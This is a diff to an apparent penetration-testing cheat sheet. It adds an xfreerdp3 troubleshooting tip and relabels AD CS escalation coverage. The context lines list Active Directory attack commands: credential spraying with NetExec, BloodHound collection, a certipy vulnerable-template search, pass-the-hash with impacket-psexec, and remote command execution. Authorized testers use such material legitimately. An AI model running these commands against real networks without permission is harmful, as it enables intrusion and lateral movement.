@@ -317,6 +317,7 @@ RDP — TCP 3389
 ++++++++++++++++++++++++++++++++++++++++
 nxc rdp <ip_address> -u <user> -p <password>
 xfreerdp /v:<ip_address> /u:<user> /p:<password> /cert:ignore /dynamic-resolution +clipboard
+# 'command not found'? That box is mid-rename: FreeRDP 3 shipped as xfreerdp3 before Debian dropped the suffix. Try xfreerdp3.
 ////////////////////////////////////////
 
 
@@ -329,7 +330,7 @@ nxc ldap <ip_address> -u <user> -p <password> --bloodhound --collection All --dn
 bloodhound-python -u <user> -p <password> -d <domain> -ns <ip_address> -c All
 
 # Escalation primitives: AS-REP / Kerberoast (above) / unconstrained-deleg / GenericAll / DCSync.
-certipy-ad find -u <user>@<domain> -p <password> -dc-ip <ip_address> -vulnerable  # AD CS (ESC1-16)
+certipy-ad find -u <user>@<domain> -p <password> -dc-ip <ip_address> -vulnerable  # AD CS (ESC1–ESC17)
 impacket-psexec <domain>/<user>@<ip_address> -hashes :<NThash>   # PtH / overpass-the-hash
 nxc smb <ip_address> -u <user> -H <NThash> -x 'whoami'
 
